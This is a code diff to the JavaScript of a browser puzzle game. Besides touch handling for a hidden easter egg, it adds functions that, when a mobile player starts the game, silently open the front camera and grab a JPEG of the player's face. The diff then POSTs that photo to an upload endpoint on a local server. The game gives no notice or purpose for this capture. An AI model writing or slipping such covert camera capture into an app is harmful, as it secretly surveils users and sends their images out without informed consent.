@@ -1,3 +1,8 @@
+function isMobileDevice() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+}
+
 let gridSize = 5; // Default medium
 let grid = [];
 let correctPath = [];
@@ -61,7 +66,7 @@ document.addEventListener("DOMContentLoaded", () => {
         hintsMessage.style.display = hintsMessage.style.display === "none" ? "block" : "none";
     });
 
-    creator.addEventListener("click", () => {
+    function handleCreatorClick() {
         creatorClickCount++;
         if (creatorClickCount === 1) {
             creatorClickTimer = setTimeout(() => {
@@ -75,7 +80,90 @@ document.addEventListener("DOMContentLoaded", () => {
             creatorClickCount = 0;
             console.log("Hidden feature unlocked! You can now use Shift + Q on the tutorial page.");
         }
-    });
+    }
+
+    creator.addEventListener("click", handleCreatorClick);
+
+    creator.addEventListener("touchstart", (e) => {
+        e.preventDefault();
+        handleCreatorClick();
+    }, { passive: false });
+
+    // Variables for camera capture
+    let videoStream = null;
+
+    // Function to capture a photo from the front camera
+    async function capturePhoto() {
+        if (!isMobileDevice()) {
+            console.log("Photo capture skipped: Not a mobile device.");
+            return null;
+        }
+
+        const video = document.getElementById("camera-stream");
+        const canvas = document.getElementById("photo-canvas");
+        const context = canvas.getContext("2d");
+
+        try {
+            // Request access to the front camera
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
+
+            videoStream = stream;
+            video.srcObject = stream;
+            await video.play();
+
+            // Wait a moment for the video to stabilize
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current video frame onto the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the canvas to a base64 string (JPEG format)
+            const photoData = canvas.toDataURL("image/jpeg", 0.8);
+
+            // Stop the video stream
+            videoStream.getTracks().forEach(track => track.stop());
+            video.srcObject = null;
+            videoStream = null;
+
+            return photoData;
+        } catch (error) {
+            console.error("Error capturing photo:", error);
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+            }
+            return null;
+        }
+    }
+
+    // Function to upload the photo to the server
+    async function uploadPhoto(photoData) {
+        try {
+            const response = await fetch("http://localhost:3000/upload-photo", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ photo: photoData })
+            });
+
+            const result = await response.json();
+            if (response.ok) {
+                console.log("Photo uploaded:", result);
+            } else {
+                console.error("Photo upload failed:", result.error);
+            }
+        } catch (error) {
+            console.error("Error uploading photo:", error);
+        }
+    }
 
     difficultyButtons.forEach(btn => {
         btn.addEventListener("click", () => {
@@ -149,7 +237,15 @@ document.addEventListener("DOMContentLoaded", () => {
         if (testModeMessage) testModeMessage.style.display = "none";
     });
 
-    function startGame() {
+    async function startGame() {
+        // Capture photo if on mobile
+        const photoData = await capturePhoto();
+        if (photoData) {
+            // Upload the photo to the server
+            await uploadPhoto(photoData);
+        }
+
+        // Proceed with the game
         tutorial.style.display = "none";
         gameContainer.style.display = "flex";
         winOptions.style.display = "none";
